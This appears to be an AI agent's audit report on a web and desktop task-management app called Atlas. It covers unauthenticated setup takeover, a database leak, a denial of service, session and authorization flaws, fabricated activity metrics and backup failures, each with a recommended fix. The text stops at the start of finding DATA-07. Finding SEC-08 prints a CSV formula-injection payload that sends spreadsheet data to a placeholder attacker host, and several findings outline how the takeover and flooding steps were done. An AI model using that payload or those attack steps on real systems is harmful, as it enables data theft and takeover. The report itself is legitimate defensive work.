# Atlas Workspace — Critical Project Audit

| | |
|---|---|
| **Audit date** | 2026-10-02 |
| **Subject** | `RussellTCrivello/Atlas` @ `7cca0c0` ("first commit1"), branch `arena/01a0fb79-atlas` |
| **Version audited** | `atlas-workspace` 1.0.0 (Express 5.2.1, React 19.3.0, Vite 8.3.2, Electron 44.5.1) |
| **Performed by** | Arena.ai Agent Mode |

---

## 0. Scope, method and how to read this report

**Scope note — please read.** The request refers to a project "described below", but no description was attached. I therefore treated the repository itself — `README.md`, `PRODUCTION.md` and the 16 files in `docs/` (≈3,900 lines) — as the statement of the project's objectives, and audited three things: (a) whether those stated objectives are actually met, (b) the security / reliability / correctness / quality of what exists, and (c) what is missing, unstated or assumed. If you have a separate brief (target users, scale, compliance regime, deployment model), some priorities below may move; items that depend on such a decision are tagged ❓.

**Method.** I did not rely on reading alone. I installed the project (`npm ci`, Node 22.22.3 — 408 packages, `npm audit` = 0 vulnerabilities today), built it (`npm run build`), and ran the production bundle and the dev server against throw-away data directories. I then (1) probed the HTTP API with scripted clients for every role, (2) executed the real production React bundle inside jsdom against the live server to confirm UI-level behaviour, (3) ran the project's own `scripts/final-validation.mjs` (23/23 pass — see QA-01), (4) type-checked the code with TypeScript, (5) measured behaviour on synthetic stores of 1k / 10k / 50k tasks, and (6) simulated the service worker and the PDF export path. The repository was not modified; the only change from this audit is this file.

**Evidence tags**

| Tag | Meaning |
|---|---|
| ✅ **Reproduced** | I executed it against the running app (or the real client bundle in jsdom) and observed the result. Repro snippets are in Appendix A. |
| 🔍 **Code-confirmed** | Verified by reading the code (and, where noted, by a targeted grep/simulation), not exercised end-to-end. |
| ⚠️ **Risk** | A plausible consequence or an item I could not verify in this sandbox. |
| ❓ **Clarify** | Depends on a requirement or decision that is not stated anywhere. |

**Priority scale**

| Priority | Meaning |
|---|---|
| **P0 – Critical** | Exploitable by an unauthenticated party, or causes silent data loss / takeover. Fix before the app runs anywhere except a single-user, isolated machine. |
| **P1 – High** | Serious security, integrity or correctness defect, or a control that gives false assurance. Fix before real users or real data. |
| **P2 – Medium** | Significant quality, scale, maintainability or claims-accuracy issue. Next iteration. |
| **P3 – Low** | Polish and hygiene. |

**Not tested (limits of this audit).** No real browser (jsdom only — layout, paint and real-browser performance are not covered; timing numbers are indicative), no Electron GUI (the sandbox cannot download the Electron binary — TLS failure — nor install system libraries), no Windows/macOS, no assistive-technology testing, no print-preview rendering, no multi-machine load test.

---

## 1. Executive summary

**Verdict.** Atlas is a broad and visually polished prototype with a sensible starting point (scrypt password hashing, HttpOnly cookies, server-side RBAC on most mutations, local-only assets, clean `npm audit`). **It is not safe to run on any network-reachable host, or with data you cannot afford to lose, in its current state.** Three unauthenticated, trivially exploitable defects (P0) allow a complete wipe-and-takeover, a database download (through the documented dev quick start), and a persistent denial of service. Beyond security, the product's headline value — reliable reporting and "evidence-backed" activity intelligence — rests on synthetic numbers and metric definitions that are wrong or misleading, and a large part of the Settings console configures nothing. The accompanying "Final Acceptance Report" declares the web runtime "ready for operational use", yet its test suite never exercises the failure modes below; I reproduced 23/23 passing checks on the same build that exhibits every P0.

**The ten findings that matter most**

| # | Finding | Pri | Tag |
|---|---|---|---|
| 1 | `POST /api/setup` is unauthenticated and never checks "already configured": one request wipes the workspace and makes the caller Administrator (SEC-01) | P0 | ✅ |
| 2 | The documented quick start (`npm run app`) is a dev server bound to `0.0.0.0` that serves `/data/atlas-store.json` (all users, hashes, content) and the server source to anyone (SEC-02) | P0 | ✅ |
| 3 | Unauthenticated `POST /api/i18n/missing` writes to the persistent store: 300 requests → 12 MB store, 11.5 MB bootstrap, settings can no longer be saved (SEC-03) | P0 | ✅ |
| 4 | No input validation: one `dueDate:"x"` from any Developer — or one mistyped timezone from an admin — makes every data route return 500 for everybody (VAL-01) | P1 | ✅ |
| 5 | Persistence is not crash-safe or consistent: mutate-then-save with no rollback, no lock, no fsync; a corrupt file silently becomes an empty "first-run" workspace that anyone can claim; backups are never consulted (DATA-01/02) | P1 | ✅ |
| 6 | "Evidence ledger" and "Focused effort" are fabricated: minutes are constants per click (20/25/45/90) and empty ledgers are back-filled with invented rows (DATA-04) | P1 | ✅ |
| 7 | Authorization over-shares and under-protects: every role receives the full user directory and all settings; any Developer can forge activity as someone else; `exportData` etc. are never enforced (SEC-07) | P1 | ✅ |
| 8 | The task board, list and exports silently truncate to 50 rows; "My work" / "My focus" are not the user's work (UX-01/02) | P1 | ✅ |
| 9 | Custom i18n rewrites DOM text nodes: it changes how *user data* is displayed (an Arabic task title shows as "Projects"), and costs ~0.2–0.9 s per pass on a busy page (UX-03) | P1 | ✅ |
| 10 | Quality gates do not exist: no unit/E2E tests, no CI, TypeScript not actually checked (432 errors at the repo's own lenient settings) (QA-01, ARCH-03) | P1 | ✅ |

**By the numbers**

| Metric | Value |
|---|---|
| Findings in this report | **61** — P0: 3 · P1: 22 · P2: 28 · P3: 8 |
| Evidence | ✅ reproduced: 46 · 🔍 code-confirmed: 10 · ⚠️ risk: 1 · ❓ clarify: 4 (primary tag per finding; some carry two) |
| Source size | `app.tsx` 1,122 lines (one file: server, auth, store, reports, i18n, seeding); `src/main.tsx` 848 lines / 287 KB (avg 340 chars/line; one 88 KB line; 66 lines > 500 chars) |
| Automated tests | 0 unit/integration/E2E; 1 API smoke script (23 checks), not wired to `npm test` or CI |
| Documentation | 16 docs + README + PRODUCTION.md ≈ 3,900 lines, versus 0 automated tests |
| API surface | 47 routes; 4 are unauthenticated *and* state-changing (`/api/setup`, `/api/auth/login`, `/api/auth/logout`, `/api/i18n/missing`) |
| Settings keys that are declared but never read by any code | ≥ 27 (UX-07) |
| Scale | Bootstrap 77 ms @ 1k tasks → 708 ms @ 10k → 3.7 s @ 50k (18 MB); all-users activity report 126 ms → 2.9 s → **43 s**, blocking the whole server |

**What is genuinely good (so the fixes below are not mistaken for "start over")**

- Passwords are salted-scrypt hashed with `timingSafeEqual`; hashes are never returned by the API (only reachable through SEC-02's file leak).
- Session cookies are `HttpOnly; SameSite=Lax`; production binds to `127.0.0.1` by default; a production CSP is set; JSON bodies are capped at 1 MB; React escapes output (no `dangerouslySetInnerHTML`/`innerHTML` anywhere).
- Server-side RBAC guards exist on almost every mutation; the last active administrator cannot be *deleted*; duplicate emails are rejected on *create*; deleting a person who has a login, or a team that still has people, is blocked.
- Writes use temp-file + rename; backups, an integrity check (`/api/system`) and an audit log exist; first-run setup avoids default credentials on the default path.
- No CDN or remote assets (verified: no external URLs in the HTML/CSS); `npm audit` is clean today; the committed `dist-desktop/app.mjs` is byte-identical to a fresh build of `app.tsx`.
- The feature breadth (RBAC, workflow states, custom fields, RTL languages, exports) shows a clear product vision; much of it needs *enforcement and honesty*, not redesign.

---

## 2. Objectives versus reality (claims audit)

The project states its objectives in `README.md`, `PRODUCTION.md` and `docs/`. Each claim below was checked.

| # | Stated objective / claim (source) | What I found | Verdict |
|---|---|---|---|
| 1 | "Atlas does not expose bundled test credentials in production mode" (README) | True on the default path. But `reset:data` (CLI) ignores `ATLAS_ALLOW_DEMO_DATA` and `NODE_ENV`, seeds `maya@atlas.local / atlas-demo` (Administrator) and the server then logs *"Production-safe mode: no default or demo credentials"* (SEC-09). | ⚠️ Partly true |
| 2 | "Local-first" (README, Manual) | Server-centric app: no offline data, no sync; service worker cannot serve an offline shell (DESK-05). Accurate description: *self-hosted, single-node*. | ❌ Overstated |
| 3 | "Live dashboards" (README) | The "Live" pills are static strings. No polling/SSE/WebSocket; data refreshes only after the user's own mutations (UX-08). | ❌ Not delivered |
| 4 | "Role-based access control … enforced in both UI and Node routes" | Most mutations are guarded; reads are unscoped; `exportData`, `fieldAccess`, `moduleAccess`, `actionAccess`, `exportPermissions`, `reportingPermissions` are never enforced (SEC-07). | ⚠️ Partly true |
| 5 | "Schema-versioned embedded store … atomic persistence, integrity checks" (README, DATABASE_ARCHITECTURE) | Rename without fsync; handlers mutate memory before saving and never roll back; no lock; integrity is on-demand only (DATA-01/02/06). | ⚠️ Partly true |
| 6 | "Backup restoration works" (FINAL_ACCEPTANCE_REPORT) | Restore = manually copy a file over the store while stopped; no restore command/UI; `ATLAS_BACKUP_RETENTION=abc` deletes every backup (DATA-03). | ⚠️ Partly true |
| 7 | "Detailed evidence-backed activity reporting" (PRODUCTION.md) | "Minutes" are per-event constants; empty ledgers are back-filled with invented rows (DATA-04). | ❌ Not supported |
| 8 | "Full interface translation coverage" (FULL_INTERFACE_I18N_UPDATE) | 384 of 468 distinct static JSX strings match the catalog (~82 %); all server-generated strings, dates, numbers and export labels remain English; user data is rewritten (UX-03). | ❌ Overstated |
| 9 | "Export … respects language, direction, branding" (`exports.*` settings) | Export labels/titles are English literals; the settings are never read (UX-07). | ❌ Not delivered |
| 10 | "PWA … service worker with local shell caching" / "offline shell" | The worker never caches `/` or the JS/CSS bundles at install; simulated offline navigation resolves to `undefined` (DESK-05). | ❌ Not working |
| 11 | "Desktop packaging validated" (FINAL_ACCEPTANCE_REPORT) | `build/icon.png` and `build/icon.ico` are referenced by `package.json` and the docs but absent from the repo; the report itself says the GUI was never launched; unsigned; no auto-update (DESK-04). | ⚠️ Unverified |
| 12 | "Zero npm audit findings" | **True today**: `npm audit` → 0 vulnerabilities (408 packages, 2026-10-02). | ✅ True (point-in-time) |
| 13 | "Current Electron toolchain pinned" (README) | `electron` is `^44.5.1`; nine dependencies use the `latest` tag (BUILD-01). | ❌ Inaccurate wording |
| 14 | "No Google Fonts, CDN stylesheets, or remote UI assets" | **True**: no external URLs in HTML/CSS. (The three "Atlas" fonts are DejaVu Sans, two of them byte-identical — BUILD-03.) | ✅ True |
| 15 | "Final validation: 23 checks, 0 failures" | **Reproducible** (23/23 on Node 22.22.3). It never tests setup-after-configuration, unauthenticated routes, invalid input, report maths or the UI (QA-01). | ✅ True, non-adversarial |
| 16 | "Configure the full Atlas platform without a rebuild" (Settings page) | ≥ 27 settings are declared but never read; table-column, form-layout and action-visibility maps are stored but not consumed (UX-07). | ❌ Overstated |
| 17 | "Advanced query builder … precise operational queries" | Conditions are folded strictly left-to-right (no AND-before-OR, no grouping); `>`/`<` use `Number()` so they never match dates; the only date-like filter fields are human labels ("Tomorrow", "3d late") (UX-09). | ⚠️ Partial |
| 18 | `ATLAS_ALLOW_DEMO_DATA=true npm run reset:data` seeds dev data (README, DEVELOPMENT) | **Crashes**: `ReferenceError: Cannot access 'store' before initialization` on Node 22 + tsx (BUILD-02). | ❌ Broken |
| 19 | API reference (docs/API_REFERENCE.md) | Documents non-existent `PUT /api/alerts/:id` and `PATCH /api/alerts/:id/resolve` (both return **200 + HTML**), and a `projectRows` field that is never returned (VAL-03). | ⚠️ Partly inaccurate |
| 20 | "Export … template selection" (FUNCTIONALITY_REFERENCE) | There is no per-export template selector; only a global `printTemplate` setting. | ❌ Not delivered |

**Objective-level observations**

1. *Positioning is unstable.* The documents variously describe a single-user "local-first desktop app", a multi-user team server with RBAC and organisation-wide reporting, and an extensible "configurable operations platform". These have different security, data and scale requirements; the code satisfies none of them fully (GOV-01).
2. *"Engineering operations" is a label, not a feature set.* There is no VCS/CI integration, estimation, sprints/iterations, dependencies, comments, attachments, notifications or import (e.g. Jira/CSV) — the things that make such a tool adoptable.
3. *Configuration outruns capability.* The settings schema (notifications, webhooks, approvals, automated actions, field/module/action ACLs, holidays, working hours, SMTP-like channels) promises features that have no implementation behind them.

---

## 3. Findings

Findings are grouped by domain. P0/P1 items are written out in full; P2/P3 items use the same four fields in table form. IDs are stable so the action plan (§6) can refer to them.

### 3.1 Security (SEC)

#### SEC-01 — Unauthenticated `POST /api/setup` re-initialises a configured workspace · **P0** · ✅ Reproduced

- **Issue.** The `/api/setup` handler never checks `store.configured`. It replaces the in-memory store (`store = productionStore()`), creates a new Administrator from the request body, persists, and logs the caller in. There is no authentication, setup token, "already configured" guard or backup.
- **Evidence.** On a configured workspace (1 admin, 1 project, 5 tasks) a cookie-less `POST /api/setup` returned `200` with `role: "Administrator"`. The caller's bootstrap then showed 0 tasks / 0 projects / 1 user (the caller). The original admin's session and password both returned `401`. No `backups/` directory existed. The Electron shell exposes the same endpoint on `127.0.0.1:5173+`.
- **Impact.** Anyone who can reach the port — the LAN (SEC-02), any local process or user, a DNS-rebinding web page against a loopback server (SEC-10), or anyone once the runbook's `ATLAS_HOST=0.0.0.0` is used — can destroy all data and own the instance with one request. The acceptance suite only tests `/api/setup` *before* configuration, so this passed "final acceptance".
- **Recommendation.** Return `409` when `store.configured` is true (first statement of the handler). For first run, require a one-time setup token (printed to the console or `ATLAS_SETUP_TOKEN`) or restrict setup to loopback. Never reassign `store` inside a request handler: build and validate the new state, back up, then swap. Add a regression test (setup twice → 409).

#### SEC-02 — The documented quick start (`npm run app`) is an exposed dev server that leaks the database · **P0** · ✅ Reproduced

- **Issue.** README, DEVELOPMENT and the acceptance report all tell users to run `npm run app` (= `tsx app.tsx`, `NODE_ENV` unset). That takes the dev branch: bind `0.0.0.0`, Vite middleware rooted at the *project root*, `allowedHosts: true`, `X-Frame-Options: ALLOWALL` (not a valid value, so framing is unrestricted) and no CSP. The default data directory `./data` sits inside that root.
- **Evidence.** With the default data dir, an anonymous `GET /data/atlas-store.json` returned `200 application/json` — every user's email and scrypt hash plus all workspace content. `/app.tsx` (the server source, including hard-coded demo credentials), `/package.json` and `/electron/main.cjs` were also served. Any `Host` header was accepted; `/api/setup` was open (SEC-01); the socket was `0.0.0.0:<port>`, reachable on the host's non-loopback address.
- **Impact.** Anyone on the same network can download the full store (password hashes → offline cracking; all PII, projects, tasks, audit log) while the operator believes they are following a "production first-run" flow.
- **Recommendation.** Default dev to `127.0.0.1` (opt in to wider binding with `ATLAS_HOST`); add Vite `server.fs.deny` for `data/**`, `dist-desktop/**`; move the default data directory out of the project root (OS user-data dir); replace `allowedHosts: true` with an allow-list; use `frame-ancestors`/`SAMEORIGIN`; rewrite README so `npm run app` is explicitly *development-only* and real data uses `npm run preview`/`start` with an absolute `ATLAS_DATA_DIR`.

#### SEC-03 — Unauthenticated `POST /api/i18n/missing` writes attacker-controlled data to the persistent store · **P0** · ✅ Reproduced

- **Issue.** The route has no auth, no size/count limits, appends to `settings.localization.missingKeys` and calls `persist()` (full-file rewrite) on every call. `missingKeys` is then returned to every user in `/api/bootstrap` and echoed back by every `PUT /api/settings`.
- **Evidence.** 300 anonymous requests (20 KB each, 11 s, ~37 ms apiece) grew the store 18 KB → **12.1 MB**; the bootstrap payload for every user became **11.5 MB**; the admin's next settings save failed with **413** (client re-sends the whole settings object; 1 MB body limit).
- **Impact.** A cheap, unauthenticated, *persistent* denial of service and disk-fill that degrades every client and blocks administration until the JSON is hand-edited. Even legitimate use writes to disk once per missing key.
- **Recommendation.** Require authentication or remove the endpoint. Do not persist from this path: aggregate in memory with dedupe, length limits and a hard cap; flush periodically. Exclude `missingKeys` (and the catalogs) from `/api/bootstrap`. Add per-IP rate limiting.

#### SEC-04 — No brute-force protection; login blocks the event loop; username enumeration · **P1** · ✅ Reproduced

- **Issue.** Login uses synchronous `scryptSync`, has no throttling/lockout, doesn't audit failures, and skips hashing when the user doesn't exist.
- **Evidence.** 100 consecutive wrong passwords on the admin account → 100 × `401` in 3.2 s; no lockout or audit record (`auth.login` is written only on success). Each attempt costs ≈ 30–35 ms of exclusive CPU: 40 parallel connections (~42 attempts/s) raised `/api/health` latency from **2 ms to ≈ 5.1 s**. Median latency: existing user + wrong password **35 ms**, unknown user **2 ms** → username enumeration by timing.
- **Impact.** Unthrottled password guessing; a small unauthenticated flood stalls the entire single-threaded server (and the Electron main process, which hosts it).
- **Recommendation.** Use async `crypto.scrypt` (or argon2id off the main thread); always verify against a dummy hash when the user is unknown; per-account + per-IP exponential back-off/lockout; audit failed logins; generic error text; rate-limit middleware (and at the reverse proxy).

#### SEC-05 — Session management is minimal · **P1** · ✅ Reproduced

- **Issue.** Session id = `sid_` + 6 random bytes (**48 bits**; OWASP guidance ≥ 64, preferably 128). Sessions live in an in-memory `Map` with no TTL: the 14-day `Max-Age` is cosmetic and `settings.security.sessionDays` is never read. The `Map` is never pruned. `Secure` is off unless `ATLAS_COOKIE_SECURE=true`.
- **Evidence.** Cookie observed: `atlas_sid=sid_3e9dce8e49ee`, `Max-Age=1209600`. An admin password reset left the user's existing session valid (`/api/auth/me` → 200). A server restart invalidated every session (→ 401).
- **Impact.** A stolen token never expires; credentials changes don't revoke access; every restart (and every Electron relaunch) logs everyone out; unbounded memory growth under repeated logins.
- **Recommendation.** 128-bit random tokens; store `sha256(token) → {userId, createdAt, lastSeen}` with idle and absolute expiry (persisted or signed); revoke on password/role/disable change; honour `sessionDays`; auto-set `Secure` behind HTTPS (`trust proxy`); rotate on login; "sign out everywhere".

#### SEC-06 — Credential lifecycle gaps and administrator lock-out · **P1** · ✅ Reproduced

- **Issue.** There is no self-service "change password", no reset flow, no forced change after an admin sets an initial password, and no CLI to reset an admin password. The "last administrator" guard exists only for `DELETE`. Email uniqueness is enforced on create but not on update.
- **Evidence.** `PUT /api/users/<self> {role:"Viewer"}` → 200; afterwards `/api/system` and `PUT /api/settings` return 403 — **zero administrators remain** and nothing in the UI/API can restore one. `PUT /api/users/<bob> {email:"ADMIN@example.com"}` → 200; `/api/system` reports integrity `attention`; the second account can't log in (first match wins). The only recovery for a lost admin password is hand-editing JSON — or the destructive SEC-01 path.
- **Impact.** One misclick (or a compromised admin) permanently locks the workspace; admins know every user's initial password indefinitely.
- **Recommendation.** `POST /api/auth/password` (current + new); `mustChangePassword` flag; `npm run admin:reset-password`; refuse role change / deactivation / deletion that would leave zero active administrators; enforce unique normalised emails on update and in a store-level validator.

#### SEC-07 — Authorization is coarse, partly UI-only, and over-shares data · **P1** · ✅ Reproduced

- **Issue.**
  (a) `/api/bootstrap` returns the whole workspace to *every* authenticated role, including the full user directory (email, role, last login) and the entire `settings` tree (`security`, `integrations` incl. "webhook secrets metadata", `permissions`, `audit`, `storage`) — even though `GET /api/users` is 403 for non-admins.
  (b) `exportData` is never checked (exports are client-side; 11 `ExportMenu` instances, 0 permission checks); `fieldAccess`, `moduleAccess`, `actionAccess`, `exportPermissions`, `reportingPermissions` are never read.
  (c) `writeTasks` covers create, rename, re-project, re-assign, re-date and status of *any* task.
  (d) `POST /api/activity` accepts any `personId`.
  (e) Any role with `viewReports` can pull per-person activity/"minutes" for anyone (`userId=<id>`).
  (f) The client treats the role *named* "Administrator" as superuser, the server uses permission lists (drift).
- **Evidence.** A Viewer's bootstrap contained 4 users with emails/roles and the security/integrations/permissions/audit branches. A Developer rewrote a manager-owned task's assignee, title, priority and due date (role text: "update task progress"), and posted an activity entry attributed to a colleague (recorded person = the colleague).
- **Impact.** Privilege boundaries are weaker than the UI and docs imply; forged attribution undermines the product's reporting purpose; future secrets stored in `settings.integrations` would be visible to Viewers.
- **Recommendation.** Role-scoped DTOs (return only what the role may see); one central `can(user, action, resource)` with ownership/team rules; finer permissions (`task.create`, `task.assign`, `task.edit.own`, `task.transition`); bind activity `personId` to `req.user.personId` unless the caller has `managePeople`; enforce or delete every inert policy map; if `exportData` is to mean anything, move exports behind an audited server endpoint.

#### SEC-08 — CSV formula injection in exports · **P1** · ✅ Reproduced (client executed in jsdom)

- **Issue.** The CSV exporter quotes cells but does not neutralise cells beginning with `=`, `+`, `-`, `@`, tab or CR.
- **Evidence.** A Developer created a task titled `=HYPERLINK("http://evil.test/?d="&A1&B1,"Click to view")`; a Manager's "Export → CSV" produced the cell unescaped. (XLSX uses inline strings and is not affected.)
- **Impact.** Any writer can plant a formula that executes (data exfiltration, phishing, DDE on some Excel configurations) when a manager opens a shared export.
- **Recommendation.** Prefix risky cells with `'` (or a tab), per OWASP CSV-injection guidance; apply to every CSV path; add a test.

#### SEC-09 — "No demo credentials in production" can be bypassed, and the banner then lies · **P1** · ✅ Reproduced

- **Issue.** `--reset-data` (`npm run reset:data`) does not check `ATLAS_ALLOW_DEMO_DATA` or `NODE_ENV`. `ATLAS_ALLOW_DEMO_DATA=true` makes the *unauthenticated* `/api/setup/status` return every demo account's password, independent of `NODE_ENV`. Demo passwords are hard-coded in source and in the committed bundle.
- **Evidence.** `NODE_ENV=production node dist-desktop/app.mjs --reset-data` (no flag) → `maya@atlas.local / atlas-demo` logs in as Administrator, while the server prints "*Production-safe mode: no default or demo credentials; workspace configured*". With the flag set, `/api/setup/status` returned all four passwords to an anonymous caller. (The documented dev command itself crashes — BUILD-02.)
- **Impact.** One mistyped command or environment variable turns a production instance into one with publicly known admin credentials, with a reassuring log line.
- **Recommendation.** Refuse seeding when `NODE_ENV=production` or the flag is absent; never serve passwords from an endpoint (print them in the CLI once); generate random demo passwords at seed time; print an accurate startup banner (list `sample:true` users if present).

#### SEC-10 – SEC-13 (P2) — Hardening, storage, audit

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **SEC-10** | **HTTP hardening gaps** (✅/🔍). Production CSP allows `script-src 'unsafe-inline'` although the built `index.html` has no inline script; no HSTS/Permissions-Policy/COOP; `X-Powered-By: Express`; no `Cache-Control: no-store` on authenticated JSON; `Host` header never validated (any host accepted — DNS-rebinding exposure for the loopback/Electron server); no `Origin` check on mutations (SameSite=Lax is the only CSRF control); 400/413/500 return HTML. | Weak XSS containment if any injection is ever introduced; cached sensitive data on shared machines; browser-reachable loopback API via rebinding. | P2 | Drop `'unsafe-inline'` from `script-src` (verify no inline script); add `helmet`; validate `Host` against an allow-list; check `Origin`/`Sec-Fetch-Site` on non-GET; `Cache-Control: no-store` on `/api/*`; disable `x-powered-by`; return JSON errors. |
| **SEC-11** | **Password storage parameters** (🔍). `scrypt` at Node defaults (N=2¹⁴ ≈ 16 MiB — below OWASP's current minimum N=2¹⁷); parameters are not encoded in `scrypt$salt$key`, so cost can't be raised without a format change; no rehash-on-login; non-`scrypt$` stored values are compared as plaintext (`stored === password`); password policy = ≥ 8 chars only and the setup "strength" meter is length-only; `settings.security.passwordMinLength` is ignored. | Cheaper offline cracking after any leak (SEC-02); false assurance from the UI policy field. | P2 | Move to async scrypt with encoded params (`scrypt$N$r$p$salt$key`) or argon2id; rehash on login; drop the plaintext branch; honour `passwordMinLength`; add a breached-password/common-password check. |
| **SEC-12** | **Data at rest** (✅/⚠️). The store, backups and data dir are created world-readable (`644/755` under umask 022); the store holds PII (emails, names, activity text) and password hashes in plaintext JSON, copied unencrypted into `backups/`; no encryption option; on desktop, protection relies solely on the OS profile permissions. | Other local users can read all data and hashes on shared machines; stolen backups expose everything. | P2 | Create data dir `0700` and files `0600`; document OS-level disk encryption; optional encrypted backups; keep backups off-box (DATA-03). |
| **SEC-13** | **Audit trail is thin and mutable** (✅/🔍). Only successful actions are logged (no failed logins, 403s, exports or reads); no IP, user-agent, request id or before/after values; `trackReads` / `trackExports` / `trackWrites` are no-ops; the log lives in the same editable JSON file, is pruned by an admin-configurable retention, and a Viewer can create audit entries via `PATCH /api/alerts/:id {}` (VAL-04). | Weak accountability and forensics; "audit" claims exceed what is recorded. | P2 | Append-only audit store (separate table/file with hash chaining), record denials and exports with actor/IP/UA, make `track*` flags real or remove them, restrict who can shorten retention. |

### 3.2 Data integrity, persistence and reliability (DATA)

#### DATA-01 — A corrupt or truncated store silently becomes an empty, claimable workspace · **P1** · ✅ Reproduced

- **Issue.** If `atlas-store.json` fails to parse, `loadStore()` renames it to `atlas-store-corrupt-<ts>.json` and writes a brand-new first-run store. It never looks at `backups/`, never refuses to start, and reports only via `console.error`.
- **Evidence.** A truncated store (simulated crash/disk-full) → log "*Atlas store could not be parsed. Moved corrupt file…*", `/api/setup/status` → `configured:false`, the one existing backup untouched, and the next anonymous visitor became Administrator (`POST /api/setup` → 200).
- **Impact.** To users it looks like total data loss; to an attacker it is a takeover window (compounded by SEC-01). Recovery depends on someone noticing a renamed file.
- **Recommendation.** On parse failure, **fail closed**: refuse to serve and print recovery instructions, or automatically restore the newest *valid* backup and flag the instance read-only until an admin confirms. Validate the file against the schema before replacing anything; keep N generations.

#### DATA-02 — "Atomic persistence" is neither durable nor consistent, and nothing prevents concurrent writers · **P1** · ✅ Reproduced

- **Issue.** (a) Writes use `writeFileSync` + `renameSync` without `fsync` (file or directory), so a power loss can leave an empty/old file. (b) Handlers mutate the in-memory store first and call `persist()` afterwards; if `persist()` throws (disk full, read-only volume) there is no rollback. (c) There is no file lock or single-instance guard. (d) The CLI commands (`--reset-data`, `--init-production`, `--backup-data`) operate on the file while a running server holds divergent state.
- **Evidence.** With the data directory made read-only, `POST /api/teams` returned 500 but the team stayed visible to every user (and `/api/health` stayed `ok:true`); after a restart it silently vanished. Two server processes on the same data dir: instance A's team was overwritten by instance B's next write (last writer wins). `--init-production` while the server ran was undone by the server's next write.
- **Impact.** Users see and rely on data that was never saved; health checks cannot detect it; two Electron launches (DESK-01) or an admin running a CLI command during service can lose updates.
- **Recommendation.** Build the next state → persist → swap (rollback on failure); `fsync` temp file and directory; take a lock file (or move to SQLite WAL); make `/api/health` check writability and the last successful save; refuse CLI mutations while a server holds the lock.

#### DATA-03 — Backup and restore are incomplete, and one setting deletes all backups · **P1** · ✅ Reproduced

- **Issue.** Backups live in the same directory/disk as the store; there is no restore command or UI (docs: "stop Atlas and `cp`"); no integrity check of a backup; no automatic backup before startup normalisation, schema bumps or destructive actions (`/api/setup`, project delete cascade, seed removal). `ATLAS_BACKUP_RETENTION` is parsed with `Math.max(3, Math.min(100, Number(x)))` — a non-numeric value yields `NaN`, and `slice(NaN)` selects *every* file. The "per-write backup" mode makes the 25-file retention window equal to the last 25 writes (minutes of activity).
- **Evidence.** 3 backups exist; `ATLAS_BACKUP_RETENTION=abc npm run backup:data` prints "*Created backup …*" and leaves **0** files — including the one just created.
- **Impact.** The safety net is least reliable exactly when needed (typo in an env var, disk failure, ransomware, accidental delete).
- **Recommendation.** Validate env parsing (`Number.isFinite`, defaults); add `npm run restore:data <file>` with schema validation and a pre-restore snapshot; automatic daily + pre-migration + pre-destructive backups with generation-based retention (e.g. 7 daily / 4 weekly); off-box copy guidance; backup verification (checksum + parse test).

#### DATA-04 — The "evidence ledger" and "Focused effort" are fabricated · **P1** · ✅ Reproduced

- **Issue.** (a) `logWorkEvent` assigns a *constant* number of minutes per click — create 20, edit 25, move 45, complete 90 (seed rows 35–155) — and the UI labels the total "**Focused effort**" and the table "**Evidence ledger**". (b) `normalizeStore()` runs `buildSeedWorkLogs()` whenever `workLogs` is empty but tasks/activities exist, inventing times (`09:10`, `10:25` …) and minutes for **real** tasks and flagging them `sample:false`.
- **Evidence.** Ten drag-and-drops with no real work added **450 "minutes" (7.5 h)** to the assignee's report. A store with one real completed task and an empty ledger came back after restart with a persisted row "Completed task · 95 m · 09:10" that no one performed.
- **Impact.** Anyone using these reports for staffing or performance decisions is using made-up data that can be inflated by dragging cards. Combined with GOV-02 this is also a people-analytics/legal risk.
- **Recommendation.** Remove synthetic back-fill entirely (migrations must never invent history). Either drop "minutes" or capture real time (explicit time entries / timers) and relabel; make the ledger append-only and immutable; show provenance (`source`) in every row; rename headings to what they are ("Activity events").

#### DATA-05 — Referential integrity is not enforced on write · **P2** · ✅ Reproduced

| Issue | Evidence | Impact | Pri | Recommendation |
|---|---|---|---|---|
| Tasks/milestones accept non-existent `projectId`/`assigneeId`; in an empty workspace the UI posts `projectId:""` → stored as `0`; `/api/system` then reports warnings that nothing prevents. | Task with `projectId:99999, assigneeId:"person_x"` → 200; first task in a new workspace got `projectId 0`. | Orphans accumulate; "Workspace" placeholder rows; reports mis-attribute. | P2 | Validate references (FK-style) in every write; reject or default explicitly; require ≥ 1 project before tasks. |
| Deleting a person silently re-assigns all their tasks to *whoever pressed delete*; deleting a project leaves alerts and ledger rows dangling (ledger rows for deleted tasks are relabelled "Daily update" with an empty task id). | "Leaver task" assignee became the deleting admin; alert kept `projectId:1` after project delete; deleted-task ledger rows show task "Daily update". | Silent ownership transfer; corrupted history (also REP-02). | P2 | Soft-delete/archival (`deletedAt`) with explicit re-assignment dialogs; cascade or block deletes with visible counts; keep denormalised names in ledger rows. |
| Task display ids are derived from the *editable, non-unique* project code. | Editing code `PAY`→`PAYROLL2` changed `PAY-004` → `PAYROLL2-004`; a second project with the same code was accepted. | Ids quoted in chats/exports break; ambiguous keys. | P2 | Immutable per-project key (unique, validated); per-project task sequence; keep the numeric id as the canonical reference. |
| The user form defaults "Linked person" to `people[0]` (usually the admin's own profile) and the API doesn't enforce 1:1 user↔person. | Code: `personId: record?.personId \|\| firstPerson`. | New accounts' actions are attributed to the admin's person in all reports. | P2 | Default to "create new person" or require an explicit choice; enforce uniqueness of `personId` on users. |
| Team deletion ignores projects that reference the team. | Code: only `people` are checked. | Projects with a dangling `teamId`. | P3 | Check projects too. |

#### DATA-06 — No versioned migrations; startup rewrites the store; unbounded growth · **P2** · ✅/🔍

- **Issue.** `normalizeStore()` is a "make it look like today's shape" function applied to every load *and* every save; `schemaVersion` is just stamped, there are no stepwise migrations, no pre-migration backup, no downgrade protection and no migration tests. `workLogs` never expire; `auditLogs` live in the same file, so every mutation re-serialises the full history. `Math.max(0, ...next.tasks.map(...))` throws `RangeError` once an array exceeds roughly 125–150k entries (the same construct fails at 150k elements on Node 22), which would prevent start-up.
- **Impact.** An upgrade can irreversibly reshape data with no way back; the single file grows without bound.
- **Priority / Recommendation.** P2 — introduce numbered migrations with a mandatory backup, migration tests against fixture stores, a `schemaVersion` compatibility check (refuse newer-than-known), retention for `workLogs`, a reduce-based max.

#### DATA-07 — Behaviour depends on the process's working directory · **P2** · ✅ Reproduced

- **Issue.** `ATLAS_ROOT`, the static dir and the data dir all default to `process.cwd()`. Docs never say to set absolute paths for service managers (systemd/pm2 start in `/`).
